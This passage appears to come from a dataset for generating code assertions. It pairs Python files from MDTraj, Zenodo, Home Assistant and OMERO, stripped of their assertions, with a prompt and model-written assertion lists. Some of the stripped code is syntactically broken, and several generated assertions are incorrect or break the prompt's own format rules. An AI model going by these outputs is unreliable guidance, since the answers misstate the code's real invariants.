20# License along with MDTraj. If not, see <http://www.gnu.org/licenses/>.
21##############################################################################
22
23
24import os
25import shutil
26import tempfile
27import subprocess
28from distutils.spawn import find_executable
29
30import mdtraj as md
31from mdtraj.testing import get_fn, eq, skipif
32
33import numpy as np
34import scipy.sparse
35
36###############################################################################
37# Globals
38###############################################################################
39
40HAVE_DSSP = find_executable('mkdssp')
41tmpdir = None
42
43def setup():
44    global tmpdir
45    tmpdir = tempfile.mkdtemp()
46
47def teardown():
48    shutil.rmtree(tmpdir)
49
50def test_hbonds():
51    t = md.load(get_fn('2EQQ.pdb'))
52    ours = md.geometry.hbond.kabsch_sander(t)
53
54@skipif(not HAVE_DSSP, ""This tests required mkdssp to be installed, from http://swift.cmbi.ru.nl/gv/dssp/"")
55def test_hbonds_against_dssp():
56    t = md.load(get_fn('2EQQ.pdb'))[0]
57    pdb = os.path.join(tmpdir, 'f.pdb')
58    dssp = os.path.join(tmpdir, 'f.pdb.dssp')
59    t.save(pdb)
60
61    cmd = ['mkdssp', '-i', pdb, '-o', dssp]
62    subprocess.check_output(' '.join(cmd), shell=True)
63    energy = scipy.sparse.lil_matrix((t.n_residues, t.n_residues))
64
65    # read the dssp N-H-->O column from the output file
66    with open(dssp) as f:
67        # skip the lines until the description of each residue's hbonds
68        while not f.readline().startswith('  #  RESIDUE AA STRUCTURE'):
69            continue
70
71        for i, line in enumerate(f):
72            line = line.rstrip()
73            offset0, e0 = map(float, line[39:50].split(','))
74            offset1, e1 = map(float, line[61:72].split(','))
75            if e0 <= -0.5:
76                energy[int(i+offset0), i] = e0
77            if e1 <= -0.5:
78                energy[int(i+offset1), i] = e1
79
80    dssp = energy.todense()
81    ours = md.geometry.hbond.kabsch_sander(t)[0].todense()
82
83    # There is tricky issues with the rounding right at the -0.5 cutoff,
84    # so lets just check for equality with DSSP at -0.6 or less
85    eq((dssp < -0.6), (ours < -0.6))
86    eq(dssp[dssp < -0.6], ours[ours < -0.6], decimal=1)
87
88
89def test_baker_hubbard_0():
90     t = md.load(get_fn('2EQQ.pdb'))
91
92     # print('to view the hbonds defined in 2EQQ by baker_hubbard()')
93     # print('put these commands into pymol on top of the pdb:\n')
94     # for e in md.geometry.hbond.baker_hubbard(t):
95     #     print('distance RANK %d, RANK %d' % (e[1], e[2]))
96
97     # these are the results produced by the algorithm on this protein as
98     # of 11/26/13. This unit test basically just ensures that the method
99     # runs and produces the same results it did then. It's no guarentee that
100     # these are the ""TRUE"" hydrogen bonds in this system.
101     ref =  np.array([[0, 10, 8], [0, 11, 7], [69, 73, 54], [76, 82, 65],
102                      [119, 131, 89], [140, 148, 265], [166, 177, 122],
103                      [181, 188, 231], [209, 217, 215], [221, 225, 184],
104                      [228, 239, 186], [235, 247, 216], [262, 271, 143],
105                      [298, 305, 115], [186, 191, 215], [413, 419, 392]])
106     eq(ref, md.geometry.hbond.baker_hubbard(t))
107
108def test_baker_hubbard_1():
109    # no hydrogens in this file -> no hydrogen bonds
110    t = md.load(get_fn('1bpi.pdb'))
111    eq(np.zeros((0, 3), dtype=int), md.baker_hubbard(t))
112
113def test_baker_hubbard_2():
114    t = md.load(get_fn('1vii_sustiva_water.pdb'))
115    triplets = md.baker_hubbard(t)
116    N = 1000
117    rows = triplets[:, 0] * N*N + triplets[:, 1] * N + triplets[:, 2]
118    # ensure that there aren't any repeat rows
119    eq(len(np.unique(rows)), len(rows))
120
121
122def test_wernet_nilsson_0():
123    # no hydrogens in this file -> no hydrogen bonds
124    t0 = md.load(get_fn('1bpi.pdb'))
125    eq(np.zeros((0, 3), dtype=int), md.wernet_nilsson(t0)[0])
126
127
128def test_wernet_nilsson_1():
129    # one of these files has PBCs and the other doesnt
130    for fn in ['2EQQ.pdb', '4ZUO.pdb']:
131        t = md.load(get_fn(fn))
132
133        result = md.wernet_nilsson(t)
134        for frame, hbonds in enumerate(result):
135            for d_i, h_i, a_i in hbonds:
136            # to make sure the criterion is giving back totally implausible stuff
137            if len(hbonds) > 0:
138","[['len(md.wernet_nilsson(t0))', '==', 'len(t0)'], ['len(result)', '==', 'len(t)'], ['t.topology.atom(h_i).element.symbol', '==', ""'H'""], ['np.all(md.compute_distances(t[frame]', '==', 'True']]",10,4,0.4,0.0007008936393902,"['HAVE_DSSP', 'tmpdir', 't', 'ours', 'pdb', 'dssp', 'cmd', 'energy', 'line', 'offset0', 'e0', 'offset1', 'e1', 'energy[int(i+offset0)', 'i]', 'energy[int(i+offset1)', 'ref', 'triplets', 'N', 'rows', 't0', 'result']",22,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['HAVE_DSSP', 'tmpdir', 't', 'ours', 'pdb', 'dssp', 'cmd', 'energy', 'line', 'offset0', 'e0', 'offset1', 'e1', 'energy[int(i+offset0)', 'i]', 'energy[int(i+offset1)', 'ref', 'triplets', 'N', 'rows', 't0', 'result']
*Code:

1##############################################################################
2# MDTraj: A Python Library for Loading, Saving, and Manipulating
3#         Molecular Dynamics Trajectories.
4# Copyright 2012-2013 Stanford University and the Authors
5#
6# Authors: Robert McGibbon
7# Contributors:
8#
9# MDTraj is free software: you can redistribute it and/or modify
10# it under the terms of the GNU Lesser General Public License as
11# published by the Free Software Foundation, either version 2.1
12# of the License, or (at your option) any later version.
13#
14# This library is distributed in the hope that it will be useful,
15# but WITHOUT ANY WARRANTY; without even the implied warranty of
16# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
17# GNU Lesser General Public License for more details.
18#
19# You should have received a copy of the GNU Lesser General Public
20# License along with MDTraj. If not, see <http://www.gnu.org/licenses/>.
21##############################################################################
22
23
24import os
25import shutil
26import tempfile
27import subprocess
28from distutils.spawn import find_executable
29
30import mdtraj as md
31from mdtraj.testing import get_fn, eq, skipif
32
33import numpy as np
34import scipy.sparse
35
36###############################################################################
37# Globals
38###############################################################################
39
40HAVE_DSSP = find_executable('mkdssp')
41tmpdir = None
42
43def setup():
44    global tmpdir
45    tmpdir = tempfile.mkdtemp()
46
47def teardown():
48    shutil.rmtree(tmpdir)
49
50def test_hbonds():
51    t = md.load(get_fn('2EQQ.pdb'))
52    ours = md.geometry.hbond.kabsch_sander(t)
53
54@skipif(not HAVE_DSSP, ""This tests required mkdssp to be installed, from http://swift.cmbi.ru.nl/gv/dssp/"")
55def test_hbonds_against_dssp():
56    t = md.load(get_fn('2EQQ.pdb'))[0]
57    pdb = os.path.join(tmpdir, 'f.pdb')
58    dssp = os.path.join(tmpdir, 'f.pdb.dssp')
59    t.save(pdb)
60
61    cmd = ['mkdssp', '-i', pdb, '-o', dssp]
62    subprocess.check_output(' '.join(cmd), shell=True)
63    energy = scipy.sparse.lil_matrix((t.n_residues, t.n_residues))
64
65    # read the dssp N-H-->O column from the output file
66    with open(dssp) as f:
67        # skip the lines until the description of each residue's hbonds
68        while not f.readline().startswith('  #  RESIDUE AA STRUCTURE'):
69            continue
70
71        for i, line in enumerate(f):
72            line = line.rstrip()
73            offset0, e0 = map(float, line[39:50].split(','))
74            offset1, e1 = map(float, line[61:72].split(','))
75            if e0 <= -0.5:
76                energy[int(i+offset0), i] = e0
77            if e1 <= -0.5:
78                energy[int(i+offset1), i] = e1
79
80    dssp = energy.todense()
81    ours = md.geometry.hbond.kabsch_sander(t)[0].todense()
82
83    # There is tricky issues with the rounding right at the -0.5 cutoff,
84    # so lets just check for equality with DSSP at -0.6 or less
85    eq((dssp < -0.6), (ours < -0.6))
86    eq(dssp[dssp < -0.6], ours[ours < -0.6], decimal=1)
87
88
89def test_baker_hubbard_0():
90     t = md.load(get_fn('2EQQ.pdb'))
91
92     # print('to view the hbonds defined in 2EQQ by baker_hubbard()')
93     # print('put these commands into pymol on top of the pdb:\n')
94     # for e in md.geometry.hbond.baker_hubbard(t):
95     #     print('distance RANK %d, RANK %d' % (e[1], e[2]))
96
97     # these are the results produced by the algorithm on this protein as
98     # of 11/26/13. This unit test basically just ensures that the method
99     # runs and produces the same results it did then. It's no guarentee that
100     # these are the ""TRUE"" hydrogen bonds in this system.
101     ref =  np.array([[0, 10, 8], [0, 11, 7], [69, 73, 54], [76, 82, 65],
102                      [119, 131, 89], [140, 148, 265], [166, 177, 122],
103                      [181, 188, 231], [209, 217, 215], [221, 225, 184],
104                      [228, 239, 186], [235, 247, 216], [262, 271, 143],
105                      [298, 305, 115], [186, 191, 215], [413, 419, 392]])
106     eq(ref, md.geometry.hbond.baker_hubbard(t))
107
108def test_baker_hubbard_1():
109    # no hydrogens in this file -> no hydrogen bonds
110    t = md.load(get_fn('1bpi.pdb'))
111    eq(np.zeros((0, 3), dtype=int), md.baker_hubbard(t))
112
113def test_baker_hubbard_2():
114    t = md.load(get_fn('1vii_sustiva_water.pdb'))
115    triplets = md.baker_hubbard(t)
116    N = 1000
117    rows = triplets[:, 0] * N*N + triplets[:, 1] * N + triplets[:, 2]
118    # ensure that there aren't any repeat rows
119    eq(len(np.unique(rows)), len(rows))
120
121
122def test_wernet_nilsson_0():
123    # no hydrogens in this file -> no hydrogen bonds
124    t0 = md.load(get_fn('1bpi.pdb'))
125    eq(np.zeros((0, 3), dtype=int), md.wernet_nilsson(t0)[0])
126
127
128def test_wernet_nilsson_1():
129    # one of these files has PBCs and the other doesnt
130    for fn in ['2EQQ.pdb', '4ZUO.pdb']:
131        t = md.load(get_fn(fn))
132
133        result = md.wernet_nilsson(t)
134        for frame, hbonds in enumerate(result):
135            for d_i, h_i, a_i in hbonds:
136            # to make sure the criterion is giving back totally implausible stuff
137            if len(hbonds) > 0:
138",6978,"[[55, 'HAVE_DSSP', '!=', None, ""Test requires mkdssp, check if it's installed""],
 [56, 't', '!=', None, ""A trajectory must be loaded""],
 [58, 'pdb', '!=', None, ""Check if pdb file path is set correctly""],
 [59, 'dssp', '!=', None, ""Check if dssp file path is set correctly""],
 [61, 'cmd', '!=', None, ""Assert that the DSSP command is properly initialized""],
 [64, 'energy', '!=', None, ""Assert that the 'energy' sparse matrix was initialized well""],
 [77, 'offset0', '>=', 0, ""Offset must be a non-negative integer""],
 [77, 'e0', '<=', -0.5, ""Hydrogen bond energy less than or equal to -0.5, specific to DSSP criteria""],
 [78, 'offset1', '>=', 0, ""Offset must be a non-negative integer""],
 [78, 'e1', '<=', -0.5, ""Hydrogen bond energy less than or equal to -0.5, specific to DSSP criteria""],
 [90, 't', '!=', None, ""A trajectory must be loaded""],
 [111, 't', '!=', None, ""A trajectory must be loaded""],
 [115, 't', '!=', None, ""A trajectory must be loaded""],
 [124, 't0', '!=', None, ""A trajectory must be loaded""],
 [130, 't', '!=', None, ""A trajectory must be loaded""]]"
jainaman224/zenodo,"# -*- coding: utf-8 -*-
#
# This file is part of Zenodo.
# Copyright (C) 2015, 2016 CERN.
#
# Zenodo is free software; you can redistribute it
# and/or modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 2 of the
# License, or (at your option) any later version.
#
# Zenodo is distributed in the hope that it will be
# useful, but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Zenodo; if not, write to the
# Free Software Foundation, Inc., 59 Temple Place, Suite 330, Boston,
# MA 02111-1307, USA.
#
# In applying this license, CERN does not
# waive the privileges and immunities granted to it by virtue of its status
# as an Intergovernmental Organization or submit itself to any jurisdiction.

""""""Simple script to make an upload via the REST API.""""""

from __future__ import absolute_import, print_function

import json
from time import sleep

import requests
from six import BytesIO


def upload(token, metadata, files, publish=True):
    """"""Make an upload.""""""
    base_url = 'http://localhost:5000/api/deposit/depositions'
    auth = {
        'Authorization': 'Bearer {0}'.format(token)
    }
    auth_json = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
    }
    auth_json.update(auth)

    r = requests.post(base_url, data='{}', headers=auth_json)
    assert r.status_code == 201
    links = r.json()['links']
    print('Create deposit:')
    print(r.json())
    # Wait for ES to index.
    sleep(1)

    for filename, stream in files:
        r = requests.post(
            links['files'],
            data=dict(filename=filename),
            files=dict(file=stream),
            headers=auth)
        assert r.status_code == 201
        print('Upload file:')
        print(r.json())

    r = requests.put(
        links['self'],
        data=json.dumps(dict(metadata=metadata)),
        headers=auth_json
    )
    assert r.status_code == 200
    print('Update metadata:')
    print(r.json())

    if publish:
        r = requests.post(links['publish'], headers=auth)
        assert r.status_code == 202
        print('Publish:')
        print(r.json())

    return r.json()['id']


def upload_test(token, publish=True):
    """"""Test upload.""""""
    metadata = {
        'title': 'My first upload',
        'upload_type': 'publication',
        'publication_type': 'book',
        'description': 'This is my first upload',
        'access_right': 'open',
        'license': 'cc-by',
        'creators': [{'name': 'Doe, John', 'affiliation': 'Zenodo'}]
    }
    files = [('test.txt', BytesIO(b'My first test upload.'))]
    return upload(token, metadata, files, publish=publish)
","
1# -*- coding: utf-8 -*-
2#
3# This file is part of Zenodo.
4# Copyright (C) 2015, 2016 CERN.
5#
6# Zenodo is free software; you can redistribute it
7# and/or modify it under the terms of the GNU General Public License as
8# published by the Free Software Foundation; either version 2 of the
9# License, or (at your option) any later version.
10#
11# Zenodo is distributed in the hope that it will be
12# useful, but WITHOUT ANY WARRANTY; without even the implied warranty of
13# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
14# General Public License for more details.
15#
16# You should have received a copy of the GNU General Public License
17# along with Zenodo; if not, write to the
18# Free Software Foundation, Inc., 59 Temple Place, Suite 330, Boston,
19# MA 02111-1307, USA.
20#
21# In applying this license, CERN does not
22# waive the privileges and immunities granted to it by virtue of its status
23# as an Intergovernmental Organization or submit itself to any jurisdiction.
24
25""""""Simple script to make an upload via the REST API.""""""
26
27from __future__ import absolute_import, print_function
28
29import json
30from time import sleep
31
32import requests
33from six import BytesIO
34
35
36def upload(token, metadata, files, publish=True):
37    """"""Make an upload.""""""
38    base_url = 'http://localhost:5000/api/deposit/depositions'
39    auth = {
40        'Authorization': 'Bearer {0}'.format(token)
41    }
42    auth_json = {
43        'Content-Type': 'application/json',
44        'Accept': 'application/json',
45    }
46    auth_json.update(auth)
47
48    r = requests.post(base_url, data='{}', headers=auth_json)
49    links = r.json()['links']
50    print('Create deposit:')
51    print(r.json())
52    # Wait for ES to index.
53    sleep(1)
54
55    for filename, stream in files:
56        r = requests.post(
57            links['files'],
58            data=dict(filename=filename),
59            files=dict(file=stream),
60            headers=auth)
61        print('Upload file:')
62        print(r.json())
63
64    r = requests.put(
65        links['self'],
66        data=json.dumps(dict(metadata=metadata)),
67        headers=auth_json
68    )
69    print('Update metadata:')
70    print(r.json())
71
72    if publish:
73        r = requests.post(links['publish'], headers=auth)
74        print('Publish:')
75        print(r.json())
76
77    return r.json()['id']
78
79
80def upload_test(token, publish=True):
81    """"""Test upload.""""""
82    metadata = {
83        'title': 'My first upload',
84        'upload_type': 'publication',
85        'publication_type': 'book',
86        'description': 'This is my first upload',
87        'access_right': 'open',
88        'license': 'cc-by',
89        'creators': [{'name': 'Doe, John', 'affiliation': 'Zenodo'}]
90    }
91    files = [('test.txt', BytesIO(b'My first test upload.'))]
92    return upload(token, metadata, files, publish=publish)
93","[['r.status_code', '==', '201'], ['r.status_code', '==', '201'], ['r.status_code', '==', '200'], ['r.status_code', '==', '202']]",4,4,1.0,0.0013778849466069,"['token', 'metadata', 'files', 'publish', 'base_url', 'auth', 'auth_json', 'r', 'links']",9,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['token', 'metadata', 'files', 'publish', 'base_url', 'auth', 'auth_json', 'r', 'links']
*Code:

1# -*- coding: utf-8 -*-
2#
3# This file is part of Zenodo.
4# Copyright (C) 2015, 2016 CERN.
5#
6# Zenodo is free software; you can redistribute it
7# and/or modify it under the terms of the GNU General Public License as
8# published by the Free Software Foundation; either version 2 of the
9# License, or (at your option) any later version.
10#
11# Zenodo is distributed in the hope that it will be
12# useful, but WITHOUT ANY WARRANTY; without even the implied warranty of
13# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
14# General Public License for more details.
15#
16# You should have received a copy of the GNU General Public License
17# along with Zenodo; if not, write to the
18# Free Software Foundation, Inc., 59 Temple Place, Suite 330, Boston,
19# MA 02111-1307, USA.
20#
21# In applying this license, CERN does not
22# waive the privileges and immunities granted to it by virtue of its status
23# as an Intergovernmental Organization or submit itself to any jurisdiction.
24
25""""""Simple script to make an upload via the REST API.""""""
26
27from __future__ import absolute_import, print_function
28
29import json
30from time import sleep
31
32import requests
33from six import BytesIO
34
35
36def upload(token, metadata, files, publish=True):
37    """"""Make an upload.""""""
38    base_url = 'http://localhost:5000/api/deposit/depositions'
39    auth = {
40        'Authorization': 'Bearer {0}'.format(token)
41    }
42    auth_json = {
43        'Content-Type': 'application/json',
44        'Accept': 'application/json',
45    }
46    auth_json.update(auth)
47
48    r = requests.post(base_url, data='{}', headers=auth_json)
49    links = r.json()['links']
50    print('Create deposit:')
51    print(r.json())
52    # Wait for ES to index.
53    sleep(1)
54
55    for filename, stream in files:
56        r = requests.post(
57            links['files'],
58            data=dict(filename=filename),
59            files=dict(file=stream),
60            headers=auth)
61        print('Upload file:')
62        print(r.json())
63
64    r = requests.put(
65        links['self'],
66        data=json.dumps(dict(metadata=metadata)),
67        headers=auth_json
68    )
69    print('Update metadata:')
70    print(r.json())
71
72    if publish:
73        r = requests.post(links['publish'], headers=auth)
74        print('Publish:')
75        print(r.json())
76
77    return r.json()['id']
78
79
80def upload_test(token, publish=True):
81    """"""Test upload.""""""
82    metadata = {
83        'title': 'My first upload',
84        'upload_type': 'publication',
85        'publication_type': 'book',
86        'description': 'This is my first upload',
87        'access_right': 'open',
88        'license': 'cc-by',
89        'creators': [{'name': 'Doe, John', 'affiliation': 'Zenodo'}]
90    }
91    files = [('test.txt', BytesIO(b'My first test upload.'))]
92    return upload(token, metadata, files, publish=publish)
93",4413,"[
[36, 'token', '!=', None, ""token should not be None""],
[36, 'metadata', '!=', None, ""metadata should not be None""],
[36, 'files', '!=', None, ""files should not be None""],
[56, 'filename', '!=', None, ""filename should not be None""],
[56, 'stream', '!=', None, ""stream should not be None""],
[77, 'r.json()[\'id\']', '!=', None, ""The response should contain an 'id'""],
[92, 'token', '!=', None, ""token should not be None""]
]"
robjohnson189/home-assistant,"""""""The tests for the notify.group platform.""""""
import unittest
from unittest.mock import MagicMock, patch

from homeassistant.bootstrap import setup_component
import homeassistant.components.notify as notify
from homeassistant.components.notify import group, demo

from tests.common import assert_setup_component, get_test_home_assistant


class TestNotifyGroup(unittest.TestCase):
    """"""Test the notify.group platform.""""""

    def setUp(self):  # pylint: disable=invalid-name
        """"""Setup things to be run when tests are started.""""""
        self.hass = get_test_home_assistant()
        self.events = []
        self.service1 = MagicMock()
        self.service2 = MagicMock()

        def mock_get_service(hass, config):
            if config['name'] == 'demo1':
                return self.service1
            else:
                return self.service2

        with assert_setup_component(2), \
                patch.object(demo, 'get_service', mock_get_service):
            setup_component(self.hass, notify.DOMAIN, {
                'notify': [{
                    'name': 'demo1',
                    'platform': 'demo'
                }, {
                    'name': 'demo2',
                    'platform': 'demo'
                }]
            })

        self.service = group.get_service(self.hass, {'services': [
            {'service': 'demo1'},
            {'service': 'demo2',
             'data': {'target': 'unnamed device',
                      'data': {'test': 'message'}}}]})

        assert self.service is not None

    def tearDown(self):  # pylint: disable=invalid-name
        """"""""Stop everything that was started.""""""
        self.hass.stop()

    def test_send_message_with_data(self):
        """"""Test sending a message with to a notify group.""""""
        self.service.send_message('Hello', title='Test notification',
                                  data={'hello': 'world'})
        self.hass.block_till_done()

        assert self.service1.send_message.mock_calls[0][2] == {
            'message': 'Hello',
            'title': 'Test notification',
            'data': {'hello': 'world'}
        }
        assert self.service2.send_message.mock_calls[0][2] == {
            'message': 'Hello',
            'target': ['unnamed device'],
            'title': 'Test notification',
            'data': {'hello': 'world', 'test': 'message'}
        }
","
1""""""The tests for the notify.group platform.""""""
2import unittest
3from unittest.mock import MagicMock, patch
4
5from homeassistant.bootstrap import setup_component
6import homeassistant.components.notify as notify
7from homeassistant.components.notify import group, demo
8
9
10
11class TestNotifyGroup(unittest.TestCase):
12    """"""Test the notify.group platform.""""""
13
14    def setUp(self):  # pylint: disable=invalid-name
15        """"""Setup things to be run when tests are started.""""""
16        self.hass = get_test_home_assistant()
17        self.events = []
18        self.service1 = MagicMock()
19        self.service2 = MagicMock()
20
21        def mock_get_service(hass, config):
22            if config['name'] == 'demo1':
23                return self.service1
24            else:
25                return self.service2
26
27                patch.object(demo, 'get_service', mock_get_service):
28            setup_component(self.hass, notify.DOMAIN, {
29                'notify': [{
30                    'name': 'demo1',
31                    'platform': 'demo'
32                }, {
33                    'name': 'demo2',
34                    'platform': 'demo'
35                }]
36            })
37
38        self.service = group.get_service(self.hass, {'services': [
39            {'service': 'demo1'},
40            {'service': 'demo2',
41             'data': {'target': 'unnamed device',
42                      'data': {'test': 'message'}}}]})
43
44
45    def tearDown(self):  # pylint: disable=invalid-name
46        """"""""Stop everything that was started.""""""
47        self.hass.stop()
48
49    def test_send_message_with_data(self):
50        """"""Test sending a message with to a notify group.""""""
51        self.service.send_message('Hello', title='Test notification',
52                                  data={'hello': 'world'})
53        self.hass.block_till_done()
54
55            'message': 'Hello',
56            'title': 'Test notification',
57            'data': {'hello': 'world'}
58        }
59            'message': 'Hello',
60            'target': ['unnamed device'],
61            'title': 'Test notification',
62            'data': {'hello': 'world', 'test': 'message'}
63        }
64","[['self.service', '==', 'not None'], ['self.service1.send_message.mock_calls[0][2]', '==', '{'], ['self.service2.send_message.mock_calls[0][2]', '==', '{']]",5,3,0.6,0.0012589173310952,"['self.hass', 'self.events', 'self.service1', 'self.service2', 'hass', 'config', 'self.service']",7,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['self.hass', 'self.events', 'self.service1', 'self.service2', 'hass', 'config', 'self.service']
*Code:

1""""""The tests for the notify.group platform.""""""
2import unittest
3from unittest.mock import MagicMock, patch
4
5from homeassistant.bootstrap import setup_component
6import homeassistant.components.notify as notify
7from homeassistant.components.notify import group, demo
8
9
10
11class TestNotifyGroup(unittest.TestCase):
12    """"""Test the notify.group platform.""""""
13
14    def setUp(self):  # pylint: disable=invalid-name
15        """"""Setup things to be run when tests are started.""""""
16        self.hass = get_test_home_assistant()
17        self.events = []
18        self.service1 = MagicMock()
19        self.service2 = MagicMock()
20
21        def mock_get_service(hass, config):
22            if config['name'] == 'demo1':
23                return self.service1
24            else:
25                return self.service2
26
27                patch.object(demo, 'get_service', mock_get_service):
28            setup_component(self.hass, notify.DOMAIN, {
29                'notify': [{
30                    'name': 'demo1',
31                    'platform': 'demo'
32                }, {
33                    'name': 'demo2',
34                    'platform': 'demo'
35                }]
36            })
37
38        self.service = group.get_service(self.hass, {'services': [
39            {'service': 'demo1'},
40            {'service': 'demo2',
41             'data': {'target': 'unnamed device',
42                      'data': {'test': 'message'}}}]})
43
44
45    def tearDown(self):  # pylint: disable=invalid-name
46        """"""""Stop everything that was started.""""""
47        self.hass.stop()
48
49    def test_send_message_with_data(self):
50        """"""Test sending a message with to a notify group.""""""
51        self.service.send_message('Hello', title='Test notification',
52                                  data={'hello': 'world'})
53        self.hass.block_till_done()
54
55            'message': 'Hello',
56            'title': 'Test notification',
57            'data': {'hello': 'world'}
58        }
59            'message': 'Hello',
60            'target': ['unnamed device'],
61            'title': 'Test notification',
62            'data': {'hello': 'world', 'test': 'message'}
63        }
64",3696,"[[16, 'self.hass', '!=', None, ""self.hass should be initialized""],
 [17, 'self.events', '==', [], ""self.events should be an empty list at initialization""],
 [18, 'self.service1', '!=', None, ""self.service1 should be initialized""], 
 [19, 'self.service2', '!=', None, ""self.service2 should be initialized""],
 [38, 'self.service', '!=', None, ""self.service should be initialized""],
 [46, 'self.hass', '!=', None, ""self.hass should not be None""],
 [51, 'self.service', '!=', None, ""self.service should be initialized""],
 [53, 'self.hass', '!=', None, ""self.hass should still exist""]]"
knabar/openmicroscopy,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# Copyright (C) 2012-2015 Glencoe Software, Inc. All Rights Reserved.
# Use is subject to license terms supplied in LICENSE.txt
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

""""""
   Tests of the changing permissions on groups

""""""

import time
from omero.testlib import ITest
import omero


class BaseChmodTest(ITest):

    """"""
    """"""

    def init(self, from_perms, to_perms):
        self.group = self.new_group(perms=from_perms)
        self.owner = self.new_client(group=self.group, owner=True)
        self.member = self.new_client(group=self.group, owner=False)
        self.from_perms = from_perms
        self.to_perms = to_perms

    def refresh(self, client):
        client.sf.getAdminService().getEventContext()  # Refresh

    def assertEqPerms(self, a, b):
        assert a.__class__ in (omero.model.PermissionsI, str)
        assert b.__class__ in (omero.model.PermissionsI, str)
        assert str(a) == str(b)

    def addData(self):
        c = omero.model.CommentAnnotationI()
        up = self.owner.sf.getUpdateService()
        self.comment = up.saveAndReturnObject(c)

    def load(self, client):
        query = client.sf.getQueryService()
        return query.get(""CommentAnnotation"", self.comment.id.val)

    def chmod(self, client):
        self.start = time.time()
        try:
            admin = client.sf.getAdminService()
            old_ctx = admin.getEventContext()
            old_grp = admin.getGroup(self.group.id.val)
            self.change_permissions(self.group.id.val, self.to_perms, client)
            new_ctx = admin.getEventContext()  # Refresh
            new_grp = admin.getGroup(self.group.id.val)
        finally:
            self.stop = time.time()
            self.elapsed = (self.stop - self.start)

        # Check old
        old_perms = old_grp.details.permissions
        self.assertEqPerms(old_ctx.groupPermissions, self.from_perms)
        self.assertEqPerms(old_ctx.groupPermissions, old_perms)

        # Check new
        new_perms = new_grp.details.permissions
        self.assertEqPerms(new_ctx.groupPermissions, self.to_perms)
        self.assertEqPerms(new_ctx.groupPermissions, new_perms)

    def assertChmod(self):
        old_comment = self.comment
        new_comment = self.load(self.owner)
        old_obj_perms = old_comment.details.permissions
        new_obj_perms = new_comment.details.permissions

        self.assertEqPerms(self.from_perms, old_obj_perms)
        self.assertEqPerms(self.to_perms, new_obj_perms)

    def assertState(self, client, canAnnotate, canEdit):
        obj = self.load(client)
        details = obj.details
        perms = details.permissions

        # Check the new perms state
        assert canAnnotate == perms.canAnnotate()
        assert canEdit == perms.canEdit()
        assert details.getCallContext() is not None
        assert details.getEventContext() is not None


class TestChmodEasy(BaseChmodTest):

    """"""
    Tests all the transitions which are known to be trivial.
    These mostly center around *adding* read permissions
    since there is nothing new to check.
    """"""

    def assertChmod(self):
        assert self.elapsed < 0.5
        BaseChmodTest.assertChmod(self)

